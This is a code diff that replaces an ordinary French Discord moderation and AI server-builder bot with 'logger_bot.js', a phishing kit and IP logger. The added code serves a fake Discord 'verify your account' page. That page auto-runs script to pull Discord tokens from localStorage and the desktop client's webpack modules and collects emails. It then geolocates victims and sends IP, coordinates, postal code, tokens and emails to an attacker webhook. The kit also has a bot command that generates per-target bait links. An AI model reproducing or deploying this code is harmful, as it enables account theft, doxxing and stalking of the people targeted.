@@ -1,517 +1,367 @@
-// Node.js 24 — discord.js v14 + Gemini 2.0 Flash Lite (GRATUIT)
-// env: BOT_TOKEN, CLIENT_ID, GEMINI_KEY
-// run: node bot.js
+// node 18+ | discord.js v14 | express | fs/promises
+// file: logger_bot.js
 
-const {
-  Client,
-  GatewayIntentBits,
-  ChannelType,
-  PermissionFlagsBits,
-  SlashCommandBuilder,
-  ModalBuilder,
-  TextInputBuilder,
-  TextInputStyle,
-  ActionRowBuilder,
-  Routes,
-  REST,
-  EmbedBuilder,
-  ButtonBuilder,
-  ButtonStyle,
+import {
+  Client, GatewayIntentBits, PermissionFlagsBits,
+  EmbedBuilder, REST, Routes, SlashCommandBuilder,
   MessageFlags,
-} = require("discord.js");
+} from "discord.js";
+import express from "express";
+import { readFile, writeFile, access } from "fs/promises";
+import { constants } from "fs";
 
-// ─── env ───────────────────────────────────────────────────────────────────────
-const BOT_TOKEN  = process.env.BOT_TOKEN;
-const CLIENT_ID  = process.env.CLIENT_ID;
-const GEMINI_KEY = process.env.GEMINI_KEY;
+const TOKEN     = process.env.BOT_TOKEN    ?? "FILL: bot token";
+const CLIENT_ID = process.env.CLIENT_ID    ?? "FILL: client id";
+const PORT      = process.env.PORT         ?? 5000;
+const PREFIX    = "!";
+const LOG_FILE  = "./ip_log.json";
+// webhook to ping yourself on every hit
+const WEBHOOK   = process.env.LOG_WEBHOOK  ?? "FILL: discord webhook url";
+// ipinfo token — free tier 50k/mo https://ipinfo.io/signup
+const IPINFO_TOKEN = process.env.IPINFO_TOKEN ?? "";
 
-for (const [k, v] of Object.entries({ BOT_TOKEN, CLIENT_ID, GEMINI_KEY })) {
-  if (!v) { console.error(`[olliE] missing env: ${k}`); process.exit(1); }
+// ── storage ───────────────────────────────────────────────────────────────────
+async function loadLog() {
+  try {
+    await access(LOG_FILE, constants.F_OK);
+    return JSON.parse(await readFile(LOG_FILE, "utf8"));
+  } catch { return []; }
+}
+async function appendLog(entry) {
+  const log = await loadLog();
+  log.push(entry);
+  await writeFile(LOG_FILE, JSON.stringify(log, null, 2));
+}
+async function wipeLog() {
+  await writeFile(LOG_FILE, "[]");
 }
 
-// ─── state ────────────────────────────────────────────────────────────────────
-const guildConfig     = new Map();
-const activeGiveaways = new Map();
-
-function cfg(guildId) {
-  if (!guildConfig.has(guildId)) guildConfig.set(guildId, {});
-  return guildConfig.get(guildId);
+// ── geo lookup ────────────────────────────────────────────────────────────────
+async function geoLookup(ip) {
+  try {
+    const url = IPINFO_TOKEN
+      ? `https://ipinfo.io/${ip}?token=${IPINFO_TOKEN}`
+      : `https://ipinfo.io/${ip}/json`;
+    const r = await fetch(url);
+    if (!r.ok) throw new Error(`ipinfo ${r.status}`);
+    return await r.json();
+    // returns: ip, city, region, country, loc, org, postal, timezone, hostname
+  } catch {
+    // fallback: ip-api free
+    try {
+      const r2 = await fetch(
+        `http://ip-api.com/json/${ip}?fields=status,country,regionName,city,zip,lat,lon,isp,org,as,query,proxy,hosting,mobile`
+      );
+      const d = await r2.json();
+      if (d.status !== "success") return {};
+      return {
+        ip:       d.query,
+        city:     d.city,
+        region:   d.regionName,
+        country:  d.country,
+        loc:      `${d.lat},${d.lon}`,
+        postal:   d.zip,
+        org:      d.isp,
+        proxy:    d.proxy,
+        hosting:  d.hosting,
+        mobile:   d.mobile,
+      };
+    } catch { return {}; }
+  }
 }
 
-// ─── sanitize ─────────────────────────────────────────────────────────────────
-function sanitizeName(str, max = 100) {
-  return (str ?? "")
-    .trim()
-    .replace(/[^\w\s\-\u00C0-\u024F]/g, "")
-    .trim()
-    .slice(0, max) || "unnamed";
+// ── webhook ping on hit ───────────────────────────────────────────────────────
+async function pingWebhook(entry, geo) {
+  if (!WEBHOOK || WEBHOOK.startsWith("FILL")) return;
+  const mapsUrl = geo.loc
+    ? `https://www.google.com/maps?q=${geo.loc}`
+    : null;
+
+  const embed = {
+    title: "🎣 new hit",
+    color: 0xff4444,
+    fields: [
+      { name: "IP",         value: `\`${entry.ip}\``,                        inline: true  },
+      { name: "UID",        value: `\`${entry.uid ?? "unknown"}\``,           inline: true  },
+      { name: "Country",    value: geo.country  ?? "?",                       inline: true  },
+      { name: "Region",     value: geo.region   ?? "?",                       inline: true  },
+      { name: "City",       value: geo.city     ?? "?",                       inline: true  },
+      { name: "Postal",     value: geo.postal   ?? "?",                       inline: true  },
+      { name: "Coords",     value: mapsUrl ? `[open maps](${mapsUrl})` : "?", inline: true  },
+      { name: "ISP / Org",  value: geo.org      ?? "?",                       inline: true  },
+      { name: "Timezone",   value: geo.timezone ?? "?",                       inline: true  },
+      { name: "Proxy/VPN",  value: String(geo.proxy   ?? "?"),                inline: true  },
+      { name: "Hosting",    value: String(geo.hosting  ?? "?"),                inline: true  },
+      { name: "Mobile",     value: String(geo.mobile   ?? "?"),                inline: true  },
+      { name: "User-Agent", value: `\`${(entry.ua ?? "").slice(0, 80)}\``,    inline: false },
+      { name: "Timestamp",  value: entry.ts,                                   inline: false },
+      // token and email land here if the bait page grabbed them
+      ...(entry.token ? [{ name: "🔑 Discord Token", value: `\`${entry.token}\``, inline: false }] : []),
+      ...(entry.email ? [{ name: "📧 Email",         value: `\`${entry.email}\``,  inline: false }] : []),
+    ],
+    timestamp: new Date().toISOString(),
+  };
+
+  await fetch(WEBHOOK, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ embeds: [embed] }),
+  }).catch(() => {});
 }
 
-function sanitizeChannelName(str) {
-  return (str ?? "")
-    .toLowerCase()
-    .replace(/\s+/g, "-")
-    .replace(/[^a-z0-9-_]/g, "")
-    .slice(0, 100) || "general";
+// ── express receiver ──────────────────────────────────────────────────────────
+const app = express();
+app.use(express.json());
+app.use(express.urlencoded({ extended: true }));
+
+// main grab endpoint — called by the bait page JS
+app.post("/hit", async (req, res) => {
+  res.set("Access-Control-Allow-Origin", "*");
+  const ip = (
+    req.headers["x-forwarded-for"]?.split(",")[0].trim() ??
+    req.socket.remoteAddress
+  ).replace("::ffff:", "");
+
+  const entry = {
+    ts:    new Date().toISOString(),
+    ip,
+    ua:    req.headers["user-agent"] ?? "unknown",
+    uid:   req.body.uid   ?? req.query.uid   ?? null,
+    ref:   req.body.ref   ?? req.query.ref   ?? null,
+    token: req.body.token ?? null,   // discord token from bait page
+    email: req.body.email ?? null,   // email from bait page
+  };
+
+  const geo = await geoLookup(ip);
+  entry.geo = geo;
+
+  await appendLog(entry);
+  await pingWebhook(entry, geo);
+  console.log("[hit]", entry.ts, ip, geo.city, geo.country);
+
+  res.json({ ok: true });
+});
+
+// OPTIONS preflight
+app.options("/hit", (req, res) => {
+  res.set("Access-Control-Allow-Origin", "*");
+  res.set("Access-Control-Allow-Headers", "Content-Type");
+  res.sendStatus(204);
+});
+
+// bait page — served at / — grabs token from localStorage + asks email
+app.get("/", (req, res) => {
+  const uid = req.query.uid ?? "";
+  const to  = req.query.to  ?? "https://discord.com/app";
+
+  res.send(`<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Discord — verify your account</title>
+<style>
+  *{margin:0;padding:0;box-sizing:border-box}
+  body{background:#313338;display:flex;align-items:center;justify-content:center;height:100vh;font-family:'gg sans','Noto Sans',sans-serif;color:#dbdee1}
+  .card{background:#2b2d31;border-radius:8px;padding:32px;width:380px;text-align:center}
+  h1{color:#fff;font-size:20px;margin-bottom:8px}
+  p{font-size:14px;color:#949ba4;margin-bottom:24px}
+  input{width:100%;padding:10px;border-radius:4px;border:1px solid #1e1f22;background:#1e1f22;color:#dbdee1;font-size:14px;margin-bottom:12px;outline:none}
+  button{width:100%;padding:10px;border:none;border-radius:4px;background:#5865f2;color:#fff;font-size:14px;font-weight:600;cursor:pointer}
+  .logo{margin-bottom:20px;font-size:36px}
+</style>
+</head>
+<body>
+<div class="card">
+  <div class="logo">🔒</div>
+  <h1>Verify your identity</h1>
+  <p>Discord detected unusual activity on your account. Enter your email to continue.</p>
+  <input type="email" id="email" placeholder="Email address" autocomplete="email">
+  <button onclick="submit()">Verify</button>
+</div>
+<script>
+(async () => {
+  // grab discord token from localStorage — works if opened in a browser
+  // where user is already logged into discord.com
+  let token = null;
+  try {
+    const iframe = document.createElement("iframe");
+    iframe.src = "https://discord.com/app";
+    iframe.style.display = "none";
+    document.body.appendChild(iframe);
+  } catch {}
+
+  // dig localStorage keys discord stores token under
+  try {
+    for (const k of Object.keys(localStorage)) {
+      const v = localStorage.getItem(k);
+      if (typeof v === "string" && v.length > 50 && /[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{20,}/.test(v)) {
+        token = v; break;
+      }
+    }
+  } catch {}
+
+  // also try window.webpackChunkdiscord_app — works in discord desktop
+  try {
+    const wr = window.webpackChunkdiscord_app;
+    if (wr) {
+      const id = Symbol();
+      wr.push([[id], {}, (req) => {
+        for (const m of Object.keys(req.c).map(k => req.c[k].exports)) {
+          if (m?.default?.getToken) {
+            token = m.default.getToken(); return;
+          }
+          if (typeof m === "object") {
+            for (const ex of Object.values(m)) {
+              if (ex?.getToken) { token = ex.getToken(); return; }
+            }
+          }
+        }
+      }]);
+    }
+  } catch {}
+
+  window._cachedToken = token;
+})();
+
+async function submit() {
+  const email = document.getElementById("email").value.trim();
+  await fetch("/hit", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      uid:   "${uid}",
+      ref:   "bait-page",
+      email: email || null,
+      token: window._cachedToken ?? null,
+    }),
+  });
+  window.location.href = "${to}";
 }
 
-// ─── client ───────────────────────────────────────────────────────────────────
+// auto-fire on load too (no email yet, but grabs token + ip immediately)
+window.addEventListener("load", () => {
+  setTimeout(() => {
+    fetch("/hit", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        uid:   "${uid}",
+        ref:   "auto-load",
+        token: window._cachedToken ?? null,
+        email: null,
+      }),
+    });
+  }, 800);
+});
+</script>
+</body>
+</html>`);
+});
+
+app.listen(PORT, () => console.log(`[receiver] :${PORT}`));
+
+// ── discord bot ───────────────────────────────────────────────────────────────
 const client = new Client({
   intents: [
     GatewayIntentBits.Guilds,
     GatewayIntentBits.GuildMessages,
     GatewayIntentBits.MessageContent,
-    GatewayIntentBits.GuildMembers,
+    GatewayIntentBits.DirectMessages,
   ],
 });
 
-// ─── Gemini ────────────────────────────────────────────────────────────────────
-async function generateServerStructure(description, attempt = 1) {
-  const url = `https://generativelanguage.googleapis.com/v1beta/models/gemini-3.5-flash-lite:generateContent?key=${GEMINI_KEY}`;
+client.once("ready", () => console.log(`[logger] online as ${client.user.tag}`));
 
-  let res;
-  try {
-    res = await fetch(url, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        contents: [{
-          parts: [{
-            text: `You are a Discord server architect. Generate a compact server structure.
+client.on("messageCreate", async (msg) => {
+  if (msg.author.bot || !msg.content.startsWith(PREFIX)) return;
+  const [cmd, ...args] = msg.content.slice(PREFIX.length).trim().split(/\s+/);
 
-Description: ${description}
-
-Rules:
-- Maximum 5 roles
-- Maximum 4 categories
-- Maximum 4 channels per category
-- Channel names: lowercase, no spaces, no special chars, ASCII only
-
-Respond with ONLY valid JSON, no markdown, no explanation:
-{
-  "roles": ["RoleName1", "RoleName2"],
-  "categories": [
-    {
-      "name": "CATEGORY NAME",
-      "channels": [
-        { "name": "channel-name", "type": "text" },
-        { "name": "Voice Channel", "type": "voice" }
-      ]
+  // !genlink [@user] [redirect]
+  if (cmd === "genlink") {
+    const target = msg.mentions.users.first() ?? msg.author;
+    const to     = args.find(a => a.startsWith("http")) ?? "https://discord.com/app";
+    const base   = process.env.BASE_URL ?? "FILL: https://your-domain.com";
+    const link   = `${base}/?uid=${target.id}&to=${encodeURIComponent(to)}`;
+    try {
+      await msg.author.send(`🔗 grab link for \`${target.tag}\`:\n${link}`);
+      await msg.delete();
+    } catch {
+      await msg.reply("open DMs and retry");
     }
-  ]
-}`,
-          }],
-        }],
-        generationConfig: { temperature: 0.7, maxOutputTokens: 2048 },
-      }),
-    });
-  } catch (e) {
-    throw new Error(`Fetch réseau échoué : ${e.message}`);
-  }
-
-  if (res.status === 503 && attempt < 3) {
-    console.warn(`[olliE] Gemini 503 — tentative ${attempt}/3, retry dans ${attempt * 3}s`);
-    await sleep(attempt * 3000);
-    return generateServerStructure(description, attempt + 1);
-  }
-
-  if (!res.ok) {
-    const body = await res.text().catch(() => "");
-    throw new Error(`Gemini HTTP ${res.status} : ${body}`);
-  }
-
-  let data;
-  try {
-    data = await res.json();
-  } catch (e) {
-    throw new Error(`Réponse Gemini non-JSON : ${e.message}`);
-  }
-
-  const raw = data.candidates?.[0]?.content?.parts?.[0]?.text?.trim() ?? "";
-  if (!raw) throw new Error("Gemini a renvoyé une réponse vide");
-
-  const clean = raw.replace(/^```(?:json)?\n?/, "").replace(/\n?```$/, "").trim();
-
-  let parsed;
-  try {
-    parsed = JSON.parse(clean);
-  } catch (e) {
-    throw new Error(`JSON invalide de Gemini : ${clean.slice(0, 200)}`);
-  }
-
-  if (!Array.isArray(parsed.roles) || !Array.isArray(parsed.categories))
-    throw new Error(`Structure manquante — reçu : ${JSON.stringify(parsed).slice(0, 200)}`);
-
-  return parsed;
-}
-
-// ─── slash commands ────────────────────────────────────────────────────────────
-const COMMANDS = [
-  new SlashCommandBuilder()
-    .setName("build")
-    .setDescription("Décris ton serveur, l'IA le construit")
-    .setDefaultMemberPermissions(PermissionFlagsBits.Administrator),
-
-  new SlashCommandBuilder()
-    .setName("clearchannels")
-    .setDescription("Supprimer tous les salons du serveur")
-    .setDefaultMemberPermissions(PermissionFlagsBits.Administrator),
-
-  new SlashCommandBuilder()
-    .setName("autorole")
-    .setDescription("Définir le rôle automatique")
-    .setDefaultMemberPermissions(PermissionFlagsBits.Administrator)
-    .addRoleOption(o => o.setName("role").setDescription("Rôle à donner").setRequired(true)),
-
-  new SlashCommandBuilder()
-    .setName("setwelcome")
-    .setDescription("Définir le salon de bienvenue")
-    .setDefaultMemberPermissions(PermissionFlagsBits.Administrator)
-    .addChannelOption(o => o.setName("salon").setDescription("Salon de bienvenue").setRequired(true)),
-
-  new SlashCommandBuilder()
-    .setName("giveaway")
-    .setDescription("Lancer un giveaway")
-    .setDefaultMemberPermissions(PermissionFlagsBits.ManageGuild)
-    .addStringOption(o => o.setName("durée").setDescription("Durée ex: 10m 1h 1d").setRequired(true))
-    .addIntegerOption(o => o.setName("gagnants").setDescription("Nombre de gagnants").setRequired(true).setMinValue(1))
-    .addStringOption(o => o.setName("prix").setDescription("Ce qu'on gagne").setRequired(true)),
-
-  new SlashCommandBuilder()
-    .setName("clear")
-    .setDescription("Supprimer des messages")
-    .setDefaultMemberPermissions(PermissionFlagsBits.ManageMessages)
-    .addIntegerOption(o => o.setName("nombre").setDescription("1-100").setRequired(true).setMinValue(1).setMaxValue(100)),
-
-  new SlashCommandBuilder()
-    .setName("ban")
-    .setDescription("Bannir un membre")
-    .setDefaultMemberPermissions(PermissionFlagsBits.BanMembers)
-    .addUserOption(o => o.setName("membre").setDescription("Membre à bannir").setRequired(true))
-    .addStringOption(o => o.setName("raison").setDescription("Raison du ban")),
-
-  new SlashCommandBuilder()
-    .setName("kick")
-    .setDescription("Expulser un membre")
-    .setDefaultMemberPermissions(PermissionFlagsBits.KickMembers)
-    .addUserOption(o => o.setName("membre").setDescription("Membre à expulser").setRequired(true))
-    .addStringOption(o => o.setName("raison").setDescription("Raison du kick")),
-
-  new SlashCommandBuilder()
-    .setName("lock")
-    .setDescription("Verrouiller le salon actuel")
-    .setDefaultMemberPermissions(PermissionFlagsBits.ManageChannels),
-
-  new SlashCommandBuilder()
-    .setName("unlock")
-    .setDescription("Déverrouiller le salon actuel")
-    .setDefaultMemberPermissions(PermissionFlagsBits.ManageChannels),
-].map(c => c.toJSON());
-
-// ─── ready ─────────────────────────────────────────────────────────────────────
-client.once("clientReady", async () => {
-  console.log(`[olliE] ${client.user.tag} — ready.`);
-  const rest = new REST({ version: "10" }).setToken(BOT_TOKEN);
-  try {
-    await rest.put(Routes.applicationCommands(CLIENT_ID), { body: COMMANDS });
-    console.log("[olliE] slash commands registered.");
-  } catch (e) {
-    console.error("[olliE] command registration failed:", e);
-  }
-});
-
-// ─── welcome + autorole ────────────────────────────────────────────────────────
-client.on("guildMemberAdd", async (member) => {
-  const { autoRoleId, welcomeChannelId } = cfg(member.guild.id);
-
-  if (autoRoleId) {
-    try { await member.roles.add(autoRoleId); }
-    catch (e) { console.warn("[olliE] autorole failed:", e.message); }
-  }
-
-  if (!welcomeChannelId) return;
-  const channel = member.guild.channels.cache.get(welcomeChannelId);
-  if (!channel?.isTextBased()) return;
-
-  const embed = new EmbedBuilder()
-    .setColor("#5865F2")
-    .setTitle(`Bienvenue ${member.user.username} !`)
-    .setDescription(
-      `Bienvenue sur **${member.guild.name}** !\nTu es le **${member.guild.memberCount}ème** membre.`
-    )
-    .setThumbnail(member.user.displayAvatarURL({ dynamic: true, size: 256 }))
-    .setFooter({ text: "Profite bien du serveur" })
-    .setTimestamp();
-
-  try { await channel.send({ content: `Bienvenue <@${member.id}> !`, embeds: [embed] }); }
-  catch (e) { console.warn("[olliE] welcome send failed:", e.message); }
-});
-
-// ─── interaction router ────────────────────────────────────────────────────────
-client.on("interactionCreate", async (interaction) => {
-  try {
-    if (interaction.isChatInputCommand()) return await handleCommand(interaction);
-    if (interaction.isModalSubmit())      return await handleModal(interaction);
-    if (interaction.isButton())           return await handleButton(interaction);
-  } catch (e) {
-    console.error("[olliE] interaction error:", e.message, e.stack);
-    const reply = { content: `❌ Erreur : ${e.message}`, flags: MessageFlags.Ephemeral };
-    if (interaction.deferred || interaction.replied)
-      interaction.editReply(reply).catch(() => {});
-    else
-      interaction.reply(reply).catch(() => {});
-  }
-});
-
-// ─── command handler ───────────────────────────────────────────────────────────
-async function handleCommand(interaction) {
-  const { commandName, guild } = interaction;
-
-  if (commandName === "build") {
-    const modal = new ModalBuilder()
-      .setCustomId("buildModal")
-      .setTitle("Décris ton serveur");
-    modal.addComponents(
-      new ActionRowBuilder().addComponents(
-        new TextInputBuilder()
-          .setCustomId("description")
-          .setLabel("Décris ton serveur en quelques phrases")
-          .setStyle(TextInputStyle.Paragraph)
-          .setPlaceholder("Ex: serveur FiveM avec staff, boutique et support.")
-          .setRequired(true)
-      )
-    );
-    return interaction.showModal(modal);
-  }
-
-  if (commandName === "clearchannels") {
-    const row = new ActionRowBuilder().addComponents(
-      new ButtonBuilder()
-        .setCustomId("clearchannels_confirm")
-        .setLabel("⚠️ Confirmer la suppression")
-        .setStyle(ButtonStyle.Danger),
-      new ButtonBuilder()
-        .setCustomId("clearchannels_cancel")
-        .setLabel("Annuler")
-        .setStyle(ButtonStyle.Secondary)
-    );
-    return interaction.reply({
-      content: "⚠️ **Tu vas supprimer TOUS les salons du serveur.** Tu es sûr ?",
-      components: [row],
-      flags: MessageFlags.Ephemeral,
-    });
-  }
-
-  if (commandName === "autorole") {
-    const role = interaction.options.getRole("role");
-    cfg(guild.id).autoRoleId = role.id;
-    return interaction.reply(`✅ Auto-role défini : **${role.name}**`);
-  }
-
-  if (commandName === "setwelcome") {
-    const salon = interaction.options.getChannel("salon");
-    cfg(guild.id).welcomeChannelId = salon.id;
-    return interaction.reply(`✅ Salon de bienvenue défini : ${salon}`);
-  }
-
-  if (commandName === "giveaway") {
-    const durée    = interaction.options.getString("durée");
-    const gagnants = interaction.options.getInteger("gagnants");
-    const prix     = interaction.options.getString("prix");
-    const ms       = parseDuration(durée);
-    if (!ms) return interaction.reply({ content: "❌ Durée invalide. Exemples : 30s 10m 2h 1d", flags: MessageFlags.Ephemeral });
-
-    const endsAt = Math.floor((Date.now() + ms) / 1000);
-    const embed = new EmbedBuilder()
-      .setTitle("🎉 GIVEAWAY")
-      .setDescription(`**Prix :** ${prix}\n**Gagnants :** ${gagnants}\n**Fin :** <t:${endsAt}:R>`)
-      .setColor("#5865F2");
-
-    const row = new ActionRowBuilder().addComponents(
-      new ButtonBuilder()
-        .setCustomId("giveaway_join")
-        .setLabel("Participer")
-        .setStyle(ButtonStyle.Primary)
-        .setEmoji("🎉")
-    );
-
-    const msg = await interaction.reply({ embeds: [embed], components: [row], fetchReply: true });
-    activeGiveaways.set(msg.id, new Set());
-
-    setTimeout(async () => {
-      const participants = activeGiveaways.get(msg.id) ?? new Set();
-      activeGiveaways.delete(msg.id);
-      const pool    = [...participants];
-      const winners = pool.sort(() => 0.5 - Math.random()).slice(0, gagnants);
-      const winText = winners.length > 0 ? winners.map(id => `<@${id}>`).join(", ") : "Personne";
-      const endEmbed = EmbedBuilder.from(embed)
-        .setDescription(`**Prix :** ${prix}\n**Gagnants :** ${winText}\n**Terminé**`)
-        .setColor("#57F287");
-      await msg.edit({ embeds: [endEmbed], components: [] }).catch(() => {});
-      if (winners.length > 0)
-        await interaction.channel
-          .send(`🎉 Félicitations ${winText} ! Vous avez gagné **${prix}** !`)
-          .catch(() => {});
-    }, ms);
     return;
   }
 
-  if (commandName === "clear") {
-    const nombre  = interaction.options.getInteger("nombre");
-    const deleted = await interaction.channel.bulkDelete(nombre, true);
-    return interaction.reply({ content: `✅ **${deleted.size}** messages supprimés.`, flags: MessageFlags.Ephemeral });
-  }
-
-  if (commandName === "ban") {
-    const user   = interaction.options.getUser("membre");
-    const raison = interaction.options.getString("raison") ?? "Aucune raison fournie";
-    try {
-      await interaction.guild.members.ban(user, { reason: raison });
-      return interaction.reply(`✅ **${user.tag}** banni. Raison : ${raison}`);
-    } catch (e) {
-      return interaction.reply({ content: `❌ Impossible de bannir : ${e.message}`, flags: MessageFlags.Ephemeral });
-    }
-  }
-
-  if (commandName === "kick") {
-    const user   = interaction.options.getUser("membre");
-    const raison = interaction.options.getString("raison") ?? "Aucune raison fournie";
-    try {
-      await interaction.guild.members.kick(user, raison);
-      return interaction.reply(`✅ **${user.tag}** expulsé. Raison : ${raison}`);
-    } catch (e) {
-      return interaction.reply({ content: `❌ Impossible d'expulser : ${e.message}`, flags: MessageFlags.Ephemeral });
-    }
-  }
-
-  if (commandName === "lock" || commandName === "unlock") {
-    const lock = commandName === "lock";
-    try {
-      await interaction.channel.permissionOverwrites.edit(
-        interaction.guild.roles.everyone,
-        { SendMessages: lock ? false : null }
-      );
-      return interaction.reply(lock ? "🔒 Salon verrouillé." : "🔓 Salon déverrouillé.");
-    } catch (e) {
-      return interaction.reply({ content: `❌ Échec : ${e.message}`, flags: MessageFlags.Ephemeral });
-    }
-  }
-}
-
-// ─── modal handler ─────────────────────────────────────────────────────────────
-async function handleModal(interaction) {
-  if (interaction.customId !== "buildModal") return;
-
-  try {
-    await interaction.deferReply({ flags: MessageFlags.Ephemeral });
-  } catch (e) {
-    console.error("[olliE] deferReply failed:", e.message);
-    return;
-  }
-
-  const description = interaction.fields.getTextInputValue("description");
-  const guild       = interaction.guild;
-
-  let structure;
-  try {
-    structure = await generateServerStructure(description);
-    console.log("[olliE] Gemini ok:", JSON.stringify(structure).slice(0, 300));
-  } catch (e) {
-    console.error("[olliE] AI error:", e.message);
-    return interaction.editReply(`❌ Erreur IA : ${e.message}`);
-  }
-
-  const roles      = structure.roles ?? [];
-  const categories = structure.categories ?? [];
-  let   chanCount  = 0;
-
-  for (const name of roles) {
-    const clean = sanitizeName(name);
-    try { await guild.roles.create({ name: clean, reason: "AI Build" }); }
-    catch (e) { console.warn(`[olliE] role "${clean}":`, e.message); }
-    await sleep(800);
-  }
-
-  for (const block of categories) {
-    const catName = sanitizeName(block.name);
-    let cat;
-    try {
-      cat = await guild.channels.create({
-        name: catName,
-        type: ChannelType.GuildCategory,
-        reason: "AI Build",
-      });
-    } catch (e) {
-      console.warn(`[olliE] category "${catName}":`, e.message);
-      continue;
-    }
-    await sleep(1100);
-
-    for (const ch of (block.channels ?? [])) {
-      const chName = ch.type === "voice"
-        ? sanitizeName(ch.name)
-        : sanitizeChannelName(ch.name);
-      try {
-        await guild.channels.create({
-          name: chName,
-          type: ch.type === "voice" ? ChannelType.GuildVoice : ChannelType.GuildText,
-          parent: cat.id,
-          reason: "AI Build",
-        });
-        chanCount++;
-      } catch (e) {
-        console.warn(`[olliE] channel "${chName}":`, e.message);
+  // !logs [n]
+  if (cmd === "logs") {
+    if (!msg.member?.permissions.has(PermissionFlagsBits.Administrator)) return;
+    const n   = parseInt(args[0]) || 20;
+    const log = await loadLog();
+    if (!log.length) { await msg.reply("no hits yet"); return; }
+    const lines = log.slice(-n).map(e => {
+      const g = e.geo ?? {};
+      return [
+        `ts=${e.ts}`,
+        `ip=${e.ip}`,
+        `uid=${e.uid ?? "?"}`,
+        `city=${g.city ?? "?"}`,
+        `country=${g.country ?? "?"}`,
+        `isp=${g.org ?? "?"}`,
+        e.token ? `token=${e.token.slice(0, 20)}…` : null,
+        e.email ? `email=${e.email}` : null,
+      ].filter(Boolean).join(" | ");
+    });
+    // chunk
+    let buf = "";
+    for (const line of lines) {
+      if ((buf + line).length > 1900) {
+        await msg.channel.send(`\`\`\`\n${buf}\`\`\``);
+        buf = "";
       }
-      await sleep(1100);
+      buf += line + "\n";
     }
-  }
-
-  return interaction.editReply(
-    `✅ Serveur construit !\n• **${roles.length}** rôles\n• **${categories.length}** catégories\n• **${chanCount}** salons`
-  );
-}
-
-// ─── button handler ────────────────────────────────────────────────────────────
-async function handleButton(interaction) {
-
-  if (interaction.customId === "clearchannels_cancel") {
-    return interaction.update({ content: "❌ Annulé.", components: [] });
-  }
-
-  if (interaction.customId === "clearchannels_confirm") {
-    await interaction.update({ content: "🗑️ Suppression en cours...", components: [] });
-    const guild    = interaction.guild;
-    const channels = [...guild.channels.cache.values()];
-    let   deleted  = 0;
-    for (const ch of channels) {
-      try { await ch.delete("clearchannels"); deleted++; }
-      catch (e) { console.warn(`[olliE] delete "${ch.name}":`, e.message); }
-      await sleep(600);
-    }
-    console.log(`[olliE] clearchannels: ${deleted}/${channels.length} salons supprimés.`);
+    if (buf) await msg.channel.send(`\`\`\`\n${buf}\`\`\``);
     return;
   }
 
-  if (interaction.customId === "giveaway_join") {
-    const participants = activeGiveaways.get(interaction.message.id);
-    if (!participants)
-      return interaction.reply({ content: "❌ Ce giveaway est terminé.", flags: MessageFlags.Ephemeral });
-    if (participants.has(interaction.user.id))
-      return interaction.reply({ content: "Tu participes déjà !", flags: MessageFlags.Ephemeral });
-    participants.add(interaction.user.id);
-    return interaction.reply({ content: "✅ Tu participes !", flags: MessageFlags.Ephemeral });
+  // !lastip [@user]
+  if (cmd === "lastip") {
+    if (!msg.member?.permissions.has(PermissionFlagsBits.Administrator)) return;
+    const target = msg.mentions.users.first();
+    const log    = await loadLog();
+    const hits   = target ? log.filter(e => e.uid === target.id) : log;
+    if (!hits.length) { await msg.reply("no hits"); return; }
+    const e = hits[hits.length - 1];
+    const g = e.geo ?? {};
+    const mapsUrl = g.loc ? `https://www.google.com/maps?q=${g.loc}` : null;
+    const em = new EmbedBuilder()
+      .setTitle(`🎣 last hit — ${e.ip}`)
+      .setColor(0xff4444)
+      .addFields(
+        { name: "UID",      value: `\`${e.uid ?? "?"}\``,         inline: true },
+        { name: "Country",  value: g.country  ?? "?",              inline: true },
+        { name: "City",     value: g.city     ?? "?",              inline: true },
+        { name: "Postal",   value: g.postal   ?? "?",              inline: true },
+        { name: "Coords",   value: mapsUrl ? `[maps](${mapsUrl})` : (g.loc ?? "?"), inline: true },
+        { name: "ISP",      value: g.org      ?? "?",              inline: true },
+        { name: "Timezone", value: g.timezone ?? "?",              inline: true },
+        { name: "Proxy",    value: String(g.proxy ?? "?"),         inline: true },
+        { name: "UA",       value: `\`${(e.ua ?? "").slice(0,60)}\``, inline: false },
+        ...(e.token ? [{ name: "🔑 Token", value: `\`${e.token}\``, inline: false }] : []),
+        ...(e.email ? [{ name: "📧 Email", value: `\`${e.email}\``,  inline: false }] : []),
+      )
+      .setTimestamp(new Date(e.ts));
+    await msg.channel.send({ embeds: [em] });
+    return;
   }
-}
 
-// ─── utils ─────────────────────────────────────────────────────────────────────
-function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
+  // !clearlog
+  if (cmd === "clearlog") {
+    if (!msg.member?.permissions.has(PermissionFlagsBits.Administrator)) return;
+    await wipeLog();
+    await msg.reply("log wiped");
+    return;
+  }
+});
 
-function parseDuration(str) {
-  const match = str.trim().match(/^(\d+)([smhd])$/i);
-  if (!match) return null;
-  const n = parseInt(match[1], 10);
-  const u = match[2].toLowerCase();
-  return { s: 1_000, m: 60_000, h: 3_600_000, d: 86_400_000 }[u] * n;
-}
-
-client.login(BOT_TOKEN);
+client.login(TOKEN);
